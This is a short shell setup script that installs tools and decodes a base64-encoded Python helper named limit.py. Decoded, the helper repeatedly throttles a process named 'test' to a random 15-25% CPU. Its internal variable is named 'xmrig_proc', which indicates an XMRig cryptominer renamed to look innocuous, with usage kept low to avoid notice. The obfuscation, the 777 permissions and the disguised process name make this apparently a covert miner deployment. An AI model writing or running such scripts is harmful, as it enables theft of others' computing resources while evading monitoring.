sudo apt install -y python3-pip cpulimit
pip3 install requests psutil
chmod 777 ./test
echo '###CONFIG###' | base64 --decode > ./config.json
echo 'aW1wb3J0IHN1YnByb2Nlc3MNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHRpbWUNCmltcG9ydCBzaWduYWwNCmltcG9ydCBwc3V0aWwNCmltcG9ydCBzeXMNCg0KTUlOX1RJTUVPVVQgPSAxMA0KTUFYX1RJTUVPVVQgPSAzMA0KTUlOX0NQVSA9IDE1DQpNQVhfQ1BVID0gMjUNCkNIRUNLX1NMRUVQID0gNQ0KDQpkZWYgZ2V0UGlkQnlOYW1lKHByb2Nlc3NOYW1lKToNCiAgICAnJycNCiAgICBDaGVjayBpZiB0aGVyZSBpcyBhbnkgcnVubmluZyBwcm9jZXNzIHRoYXQgY29udGFpbnMgdGhlIGdpdmVuIG5hbWUgcHJvY2Vzc05hbWUuDQogICAgJycnDQogICAgI0l0ZXJhdGUgb3ZlciB0aGUgYWxsIHRoZSBydW5uaW5nIHByb2Nlc3MNCiAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgICMgQ2hlY2sgaWYgcHJvY2VzcyBuYW1lIGNvbnRhaW5zIHRoZSBnaXZlbiBuYW1lIHN0cmluZy4NCiAgICAgICAgICAgIGlmIHByb2Nlc3NOYW1lLmxvd2VyKCkgaW4gcHJvYy5uYW1lKCkubG93ZXIoKToNCiAgICAgICAgICAgICAgICByZXR1cm4gcHJvYw0KICAgICAgICBleGNlcHQgKHBzdXRpbC5Ob1N1Y2hQcm9jZXNzLCBwc3V0aWwuQWNjZXNzRGVuaWVkLCBwc3V0aWwuWm9tYmllUHJvY2Vzcyk6DQogICAgICAgICAgICBwYXNzDQogICAgcmV0dXJuIE5vbmUNCg0KZGVmIHJ1bigpOg0KICAgIHJhbmRvbS5zZWVkKCkNCiAgICBwID0gTm9uZQ0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHhtcmlnX3Byb2MgPSBOb25lDQogICAgICAgICAgICBpZiBsZW4oc3lzLmFyZ3YpID4gMToNCiAgICAgICAgICAgICAgICBwaWQgPSBzeXMuYXJndlsxXQ0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgIyBDaGVjayBpZiBwcm9jZXNzIG5hbWUgY29udGFpbnMgdGhlIGdpdmVuIG5hbWUgc3RyaW5nLg0KICAgICAgICAgICAgICAgICAgICB4bXJpZ19wcm9jID0gcHN1dGlsLlByb2Nlc3MoaW50KHBpZCkpDQogICAgICAgICAgICAgICAgZXhjZXB0IChwc3V0aWwuTm9TdWNoUHJvY2VzcywgcHN1dGlsLkFjY2Vzc0RlbmllZCwgcHN1dGlsLlpvbWJpZVByb2Nlc3MpOg0KICAgICAgICAgICAgICAgICAgICB4bXJpZ19wcm9jID0gZ2V0UGlkQnlOYW1lKCJ0ZXN0IikNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgeG1yaWdfcHJvYyA9IGdldFBpZEJ5TmFtZSgidGVzdCIpDQogICAgICAgICAgICBpZiB4bXJpZ19wcm9jIGlzIE5vbmU6DQogICAgICAgICAgICAgICAgcHJpbnQoIlByb2Nlc3MgaXNuJ3QgZm91bmQiKQ0KICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoQ0hFQ0tfU0xFRVApDQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIHRpbWVvdXQgPSByYW5kb20ucmFuZHJhbmdlKE1JTl9USU1FT1VULCBNQVhfVElNRU9VVCArIDEpDQogICAgICAgICAgICBjcHVfbGltaXQgPSByYW5kb20ucmFuZHJhbmdlKE1JTl9DUFUsIE1BWF9DUFUgKyAxKQ0KICAgICAgICAgICAgcHJpbnQoIkxpbWl0aW5nIENQVSB0byAlZCBmb3IgJWQgc2Vjb25kcyIgJShjcHVfbGltaXQsIHRpbWVvdXQpKQ0KICAgICAgICAgICAgcCA9IHN1YnByb2Nlc3MuUG9wZW4oWyJjcHVsaW1pdCIsICItcCIsIHN0cih4bXJpZ19wcm9jLnBpZCksICItbCIsIHN0cihjcHVfbGltaXQpXSwgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTCwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkNCiAgICAgICAgICAgIHRpbWUuc2xlZXAodGltZW91dCkNCiAgICAgICAgICAgIHAuc2VuZF9zaWduYWwoc2lnbmFsLlNJR0lOVCkNCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgICAgICAgICAgcC5zZW5kX3NpZ25hbChzaWduYWwuU0lHSU5UKQ0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgcC53YWl0KHRpbWVvdXQ9NSkNCiAgICAgICAgICAgIHByaW50KCI/Pz8gUHJvY2VzcyB0ZXJtaW5hdGVkIikNCiAgICAgICAgICAgIHAudGVybWluYXRlKCkNCiAgICAgICAgZXhjZXB0IHN1YnByb2Nlc3MuVGltZW91dEV4cGlyZWQ6DQogICAgICAgICAgICBpZiBwLnJldHVybmNvZGUgaXMgTm9uZToNCiAgICAgICAgICAgICAgICBwcmludCgiISEhIFByb2Nlc3MgaXMgc3RpbGwgYWxpdmUiKQ0KICAgICAgICAgICAgICAgIHAudGVybWluYXRlKCkNCiAgICAgICAgDQpkZWYgbWFpbigpOg0KICAgIHJ1bigpDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ==' | base64 --decode > ./limit.py
echo 'python3 ./limit.py'
echo 'python3 ./test.py ./test'
